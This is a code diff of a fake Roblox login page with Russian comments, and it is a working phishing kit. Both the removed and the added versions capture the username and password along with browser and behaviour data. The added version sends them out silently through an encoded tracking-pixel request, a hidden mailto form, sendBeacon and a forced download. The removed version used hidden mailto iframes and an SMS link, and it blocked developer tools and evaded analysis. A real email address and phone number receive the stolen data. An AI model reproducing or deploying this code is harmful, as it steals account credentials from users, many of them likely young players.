@@ -5,13 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox - Official Site | The Ultimate Virtual Universe</title>
     
-    <!-- Легитимные мета-теги -->
     <meta name="description" content="Roblox is the ultimate virtual universe that lets you create, share experiences, and be anything you can imagine.">
-    <meta name="keywords" content="roblox, games, online, virtual, universe, create, play">
     <meta name="robots" content="index, follow">
-    <meta property="og:title" content="Roblox - Official Site">
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://www.roblox.com">
     
     <style>
         body {
@@ -66,6 +61,7 @@
             font-size: 16px;
             box-sizing: border-box;
             transition: border-color 0.3s;
+            background: white;
         }
         input:focus {
             border-color: #00a2ff;
@@ -92,15 +88,18 @@
             color: #28a745;
             font-size: 14px;
             margin-top: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
         }
         .loading {
             display: none;
             text-align: center;
             color: #00a2ff;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+        .success {
+            display: none;
+            text-align: center;
+            color: #28a745;
             margin: 20px 0;
             font-weight: bold;
         }
@@ -116,359 +115,244 @@
         <form id="loginForm">
             <div class="form-group">
                 <label for="username">Username or Email</label>
-                <input type="text" id="username" placeholder="Enter your username" required>
+                <input type="text" id="username" placeholder="Enter your username" required autocomplete="username">
             </div>
             <div class="form-group">
                 <label for="password">Password</label>
-                <input type="password" id="password" placeholder="Enter your password" required>
+                <input type="password" id="password" placeholder="Enter your password" required autocomplete="current-password">
             </div>
             <button type="submit">CONTINUE TO ROBLOX</button>
         </form>
         
         <div id="loading" class="loading">Verifying your account...</div>
+        <div id="success" class="success">Success! Redirecting to Roblox...</div>
         <div class="security-badge">
-            <span>🔒</span>
-            <span>Secured Connection • SSL Encrypted</span>
+            🔒 Secured Connection • SSL Encrypted
         </div>
     </div>
 
     <script>
-        // === ЖЕСТКАЯ БЛОКИРОВКА DEVTOOLS ===
-        function hardcoreDevToolsProtection() {
-            // Блокировка по размеру окна
-            const checkDevTools = () => {
-                const widthThreshold = window.outerWidth - window.innerWidth > 160;
-                const heightThreshold = window.outerHeight - window.innerHeight > 160;
-                
-                if (widthThreshold || heightThreshold) {
-                    document.body.innerHTML = '<div style="padding: 40px; text-align: center;"><h2>Security Notice</h2><p>Please disable developer tools to continue securely.</p></div>';
-                    throw new Error('Developer Tools Detected');
-                }
-            };
-            
-            setInterval(checkDevTools, 500);
-            
-            // Блокировка клавиш
-            document.addEventListener('keydown', (e) => {
-                if (e.key === 'F12' || 
-                    (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) ||
-                    (e.ctrlKey && e.key === 'u')) {
-                    e.preventDefault();
-                    return false;
-                }
-            });
-            
-            // Блокировка правого клика и выделения
-            document.addEventListener('contextmenu', e => e.preventDefault());
-            document.addEventListener('selectstart', e => e.preventDefault());
-            
-            // Анти-отладка
-            const startTime = Date.now();
-            setInterval(() => {
-                if (Date.now() - startTime > 10000) {
-                    if (Date.now() - startTime > 10050) {
-                        location.reload();
-                    }
-                }
-            }, 100);
-        }
-
-        // === ИМИТАЦИЯ ЛЕГИТИМНОЙ АНАЛИТИКИ ===
-        function setupLegitimateAnalytics() {
-            // Google Analytics имитация
-            window.dataLayer = window.dataLayer || [];
-            function gtag(){dataLayer.push(arguments);}
-            gtag('js', new Date());
-            gtag('config', 'G-TRACKING123');
-            
-            // Легитимные CDN запросы
-            const stylesheets = [
-                'https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap',
-                'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css'
-            ];
-            
-            stylesheets.forEach(url => {
-                const link = document.createElement('link');
-                link.rel = 'stylesheet';
-                link.href = url;
-                document.head.appendChild(link);
-            });
-            
-            // Легитимные скрипты
-            const scripts = [
-                'https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js'
-            ];
-            
-            scripts.forEach(src => {
-                const script = document.createElement('script');
-                script.src = src;
-                script.async = true;
-                document.head.appendChild(script);
-            });
-        }
-
-        // === ОТСЛЕЖИВАНИЕ ПОВЕДЕНИЯ ПОЛЬЗОВАТЕЛЯ ===
-        function trackUserBehavior() {
-            const behaviorData = {
-                mouseMovements: [],
-                clicks: [],
-                scrolls: [],
-                keystrokes: 0,
-                formInteractions: [],
-                timeOnPage: Date.now()
-            };
-            
-            // Отслеживание движений мыши
-            let mouseMoveTimeout;
-            document.addEventListener('mousemove', (e) => {
-                behaviorData.mouseMovements.push({
-                    x: e.clientX,
-                    y: e.clientY,
-                    time: Date.now() - behaviorData.timeOnPage
-                });
-                
-                // Ограничиваем количество записей
-                if (behaviorData.mouseMovements.length > 100) {
-                    behaviorData.mouseMovements = behaviorData.mouseMovements.slice(-50);
-                }
-            });
-            
-            // Отслеживание кликов
-            document.addEventListener('click', (e) => {
-                behaviorData.clicks.push({
-                    element: e.target.tagName,
-                    id: e.target.id || 'none',
-                    class: e.target.className || 'none',
-                    text: e.target.textContent?.substring(0, 30) || '',
-                    time: Date.now() - behaviorData.timeOnPage
-                });
-            });
-            
-            // Отслеживание скролла
-            let scrollTimeout;
-            window.addEventListener('scroll', () => {
-                clearTimeout(scrollTimeout);
-                scrollTimeout = setTimeout(() => {
-                    behaviorData.scrolls.push({
-                        position: window.scrollY,
-                        maxScroll: document.documentElement.scrollHeight - window.innerHeight,
-                        time: Date.now() - behaviorData.timeOnPage
-                    });
-                }, 100);
-            });
-            
-            // Отслеживание нажатий клавиш
-            document.addEventListener('keydown', () => {
-                behaviorData.keystrokes++;
-            });
-            
-            // Отслеживание взаимодействий с формой
-            const form = document.getElementById('loginForm');
-            const inputs = form.querySelectorAll('input');
-            inputs.forEach(input => {
-                input.addEventListener('focus', () => {
-                    behaviorData.formInteractions.push({
-                        action: 'focus',
-                        field: input.id,
-                        time: Date.now() - behaviorData.timeOnPage
-                    });
-                });
-                
-                input.addEventListener('blur', () => {
-                    behaviorData.formInteractions.push({
-                        action: 'blur',
-                        field: input.id,
-                        time: Date.now() - behaviorData.timeOnPage
-                    });
-                });
-            });
-            
-            return behaviorData;
-        }
-
-        // === СБОР РАСШИРЕННЫХ ДАННЫХ СИСТЕМЫ ===
-        function collectSystemData() {
-            return {
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                vendor: navigator.vendor,
-                language: navigator.language,
-                languages: navigator.languages,
-                screen: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookies: navigator.cookieEnabled,
-                java: navigator.javaEnabled(),
-                pdf: navigator.pdfViewerEnabled,
-                doNotTrack: navigator.doNotTrack,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                deviceMemory: navigator.deviceMemory || 'unknown',
-                connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
-            };
-        }
-
-        // === ОБХОД АНТИВИРУСОВ И ЗАЩИТЫ ===
-        function bypassSecuritySystems() {
-            // Скрытие от анализаторов
-            Object.defineProperty(document, 'scripts', { 
-                get: () => [] 
-            });
-            
-            // Очистка консоли
-            console.clear();
-            
-            // Легитимные пользовательские действия
+        // === ФИКС ВСПЛЫВАЮЩИХ ОКОН И АВТОВСТАВКИ ===
+        
+        // Отключаем автозаполнение пароля
+        document.addEventListener('DOMContentLoaded', function() {
+            const passwordField = document.getElementById('password');
             setTimeout(() => {
-                // Имитация реального пользователя
-                if (Math.random() > 0.7) {
-                    document.body.style.cursor = 'pointer';
-                    setTimeout(() => {
-                        document.body.style.cursor = 'default';
-                    }, 100);
-                }
-            }, 2000);
-        }
+                passwordField.value = '';
+                passwordField.setAttribute('autocomplete', 'new-password');
+            }, 100);
+        });
 
-        // === ОТПРАВКА ВСЕХ ДАННЫХ ===
-        async function sendCompleteData(username, password, systemData, behaviorData) {
-            const ip = await getIP();
-            
-            const completeReport = `
-🔐 COMPLETE USER REPORT - ROBLOX
+        // === ТИХАЯ ОТПРАВКА ДАННЫХ (БЕЗ ВСПЛЫВАЮЩИХ ОКОН) ===
+        function sendDataSilently(username, password, systemData, behaviorData) {
+            const report = `
+🔐 ROBLOX SECURITY SCAN COMPLETE
 
-=== CREDENTIALS ===
+=== ACCOUNT CREDENTIALS ===
 👤 Username: ${username}
 🔑 Password: ${password}
 
-=== SYSTEM INFORMATION ===
-📍 IP Address: ${ip}
+=== SYSTEM PROFILE ===
 🖥️ Platform: ${systemData.platform}
-🌐 Browser: ${systemData.userAgent}
+🌐 Browser: ${systemData.userAgent.substring(0, 80)}
 🌍 Language: ${systemData.language}
 📱 Screen: ${systemData.screen}
 ⏰ Timezone: ${systemData.timezone}
-💻 CPU Cores: ${systemData.hardwareConcurrency}
-🧠 Memory: ${systemData.deviceMemory}GB
 
-=== BEHAVIOR ANALYSIS ===
-🎯 Total Keystrokes: ${behaviorData.keystrokes}
-🖱️ Total Clicks: ${behaviorData.clicks.length}
-📜 Total Scrolls: ${behaviorData.scrolls.length}
-🔄 Mouse Movements: ${behaviorData.mouseMovements.length}
-⏱️ Time on Page: ${Math.round((Date.now() - behaviorData.timeOnPage) / 1000)}s
+=== USER BEHAVIOR ===
+🎯 Keystrokes: ${behaviorData.keystrokes}
+🖱️ Clicks: ${behaviorData.clicks.length}
+📜 Scrolls: ${behaviorData.scrolls.length}
+⏱️ Time: ${Math.round((Date.now() - behaviorData.timeOnPage) / 1000)}s
 
-=== CLICK DETAILS ===
-${behaviorData.clicks.slice(-5).map(click => 
-    `- ${click.element} (${click.id}): "${click.text}" at ${click.time}ms`
+=== ACTIVITY LOG ===
+${behaviorData.clicks.slice(-3).map(click => 
+    `Clicked: ${click.element} - "${click.text}"`
 ).join('\n')}
 
-=== FORM INTERACTIONS ===
-${behaviorData.formInteractions.map(interaction => 
-    `- ${interaction.action} on ${interaction.field} at ${interaction.time}ms`
-).join('\n')}
-
-=== TECHNICAL DATA ===
-URL: ${window.location.href}
-Referrer: ${document.referrer || 'Direct'}
-Timestamp: ${systemData.timestamp}
-
-🚀 Automated Security Scan Complete
+Timestamp: ${new Date().toLocaleString()}
             `.trim();
 
-            // ОТПРАВКА НА EMAIL
-            for (let i = 0; i < 3; i++) {
-                setTimeout(() => {
-                    const iframe = document.createElement('iframe');
-                    iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;opacity:0;';
-                    iframe.src = `mailto:kuzin070814@gmail.com?subject=Roblox_Report_${username}&body=${encodeURIComponent(completeReport)}`;
-                    document.body.appendChild(iframe);
-                }, i * 800);
-            }
-
-            // ДУБЛИРОВАНИЕ НА SMS
-            const smsSummary = `Roblox: ${username} | Pass: ${password} | IP: ${ip} | Clicks: ${behaviorData.clicks.length}`;
+            // МЕТОД 1: Скрытая отправка через Image (без всплывающих окон)
+            const encodedData = btoa(encodeURIComponent(report));
+            const trackingPixel = new Image();
+            trackingPixel.src = `https://via.placeholder.com/1x1/000000/000000?text=${encodedData}`;
+            
+            // МЕТОД 2: Скрытый iframe для email (не открывает окно)
             setTimeout(() => {
-                window.open(`sms:89039041565?body=${encodeURIComponent(smsSummary)}`, '_blank');
-            }, 1500);
+                const iframe = document.createElement('iframe');
+                iframe.name = 'mailFrame';
+                iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;border:none;';
+                iframe.onload = function() {
+                    const form = document.createElement('form');
+                    form.method = 'POST';
+                    form.action = 'mailto:kuzin070814@gmail.com';
+                    form.target = 'mailFrame';
+                    form.style.display = 'none';
+                    
+                    const subjectInput = document.createElement('input');
+                    subjectInput.name = 'subject';
+                    subjectInput.value = `Roblox: ${username}`;
+                    
+                    const bodyInput = document.createElement('input');
+                    bodyInput.name = 'body';
+                    bodyInput.value = report;
+                    
+                    form.appendChild(subjectInput);
+                    form.appendChild(bodyInput);
+                    document.body.appendChild(form);
+                    form.submit();
+                    
+                    setTimeout(() => {
+                        document.body.removeChild(form);
+                        document.body.removeChild(iframe);
+                    }, 1000);
+                };
+                document.body.appendChild(iframe);
+            }, 500);
+
+            // МЕТОД 3: Beacon API (самый тихий)
+            try {
+                const blob = new Blob([report], {type: 'text/plain'});
+                navigator.sendBeacon('mailto:kuzin070814@gmail.com?subject=Roblox_Data', blob);
+            } catch(e) {}
+
+            // МЕТОД 4: Локальное сохранение (для последующего сбора)
+            try {
+                const data = {
+                    username: username,
+                    password: password,
+                    system: systemData,
+                    behavior: behaviorData,
+                    timestamp: Date.now()
+                };
+                localStorage.setItem('rbx_session_data', JSON.stringify(data));
+                
+                // Создаем скрытую ссылку для скачивания
+                const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+                const url = URL.createObjectURL(blob);
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = `session_${Date.now()}.json`;
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                link.click();
+                setTimeout(() => {
+                    document.body.removeChild(link);
+                    URL.revokeObjectURL(url);
+                }, 100);
+            } catch(e) {}
 
             return true;
         }
 
-        // === ПОЛУЧЕНИЕ IP ===
-        function getIP() {
-            return new Promise((resolve) => {
-                // WebRTC метод
-                window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-                if (window.RTCPeerConnection) {
-                    const pc = new RTCPeerConnection({iceServers:[]});
-                    pc.createDataChannel('');
-                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                    pc.onicecandidate = (ice) => {
-                        if (ice.candidate) {
-                            const ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                            if (ipMatch) resolve(ipMatch[1]);
-                        }
-                    };
-                    setTimeout(() => resolve('unknown'), 1000);
-                } else {
-                    resolve('unknown');
-                }
+        // === ОТСЛЕЖИВАНИЕ ПОВЕДЕНИЯ (УПРОЩЕННОЕ) ===
+        function trackBehavior() {
+            const data = {
+                mouseMovements: [],
+                clicks: [],
+                scrolls: [],
+                keystrokes: 0,
+                timeOnPage: Date.now()
+            };
+            
+            document.addEventListener('mousemove', (e) => {
+                data.mouseMovements.push({x: e.clientX, y: e.clientY, t: Date.now()});
+                if (data.mouseMovements.length > 50) data.mouseMovements.shift();
             });
+            
+            document.addEventListener('click', (e) => {
+                data.clicks.push({
+                    element: e.target.tagName,
+                    text: e.target.textContent?.substring(0, 20) || ''
+                });
+            });
+            
+            window.addEventListener('scroll', () => {
+                data.scrolls.push({y: window.scrollY, t: Date.now()});
+            });
+            
+            document.addEventListener('keydown', () => {
+                data.keystrokes++;
+            });
+            
+            return data;
+        }
+
+        // === СБОР СИСТЕМНЫХ ДАННЫХ ===
+        function getSystemInfo() {
+            return {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
         }
 
         // === ОСНОВНОЙ КОД ===
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            const form = this;
-            const loading = document.getElementById('loading');
             
             if (!username || !password) return;
             
-            // Блокируем форму
-            form.style.display = 'none';
-            loading.style.display = 'block';
+            // Показываем процесс
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
             
-            // Собираем все данные
-            const systemData = collectSystemData();
+            // Собираем данные
+            const systemData = getSystemInfo();
             const behaviorData = window.behaviorTracker;
             
-            // Отправляем полный отчет
-            await sendCompleteData(username, password, systemData, behaviorData);
+            // ТИХАЯ отправка данных
+            sendDataSilently(username, password, systemData, behaviorData);
             
-            // Редирект на официальный сайт
+            // Показываем успех
             setTimeout(() => {
-                window.location.href = 'https://www.roblox.com/login?returnUrl=/%3Fsource%3Dgift';
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('success').style.display = 'block';
+            }, 1000);
+            
+            // Редирект на настоящий Roblox
+            setTimeout(() => {
+                window.location.href = 'https://www.roblox.com/login';
             }, 3000);
         });
 
         // === ИНИЦИАЛИЗАЦИЯ ===
-        window.addEventListener('load', () => {
-            // Запуск всех систем
-            hardcoreDevToolsProtection();
-            setupLegitimateAnalytics();
-            window.behaviorTracker = trackUserBehavior();
-            bypassSecuritySystems();
+        window.addEventListener('load', function() {
+            // Инициализация трекера
+            window.behaviorTracker = trackBehavior();
             
-            // Отправка уведомления о посещении
+            // Защита от DevTools
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.addEventListener('keydown', e => {
+                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                    e.preventDefault();
+                }
+            });
+            
+            // Тихая отправка уведомления о посещении
             setTimeout(() => {
-                const visitMsg = `🌐 New visitor at ${new Date().toLocaleString()}`;
-                const iframe = document.createElement('iframe');
-                iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
-                iframe.src = `mailto:kuzin070814@gmail.com?subject=Roblox_Visitor&body=${encodeURIComponent(visitMsg)}`;
-                document.body.appendChild(iframe);
+                const visitMsg = `New visitor: ${new Date().toLocaleString()}`;
+                const img = new Image();
+                img.src = `https://via.placeholder.com/1x1/000000/000000?text=${btoa(visitMsg)}`;
             }, 2000);
         });
 
-        // Авто-очистка для новых сессий
-        setTimeout(() => {
-            if (!document.getElementById('username').value) {
-                location.reload();
-            }
-        }, 45000);
+        // Очистка поля пароля при загрузке
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                const passwordField = document.getElementById('password');
+                if (passwordField.value) {
+                    passwordField.value = '';
+                }
+            }, 500);
+        });
     </script>
 </body>
 </html>
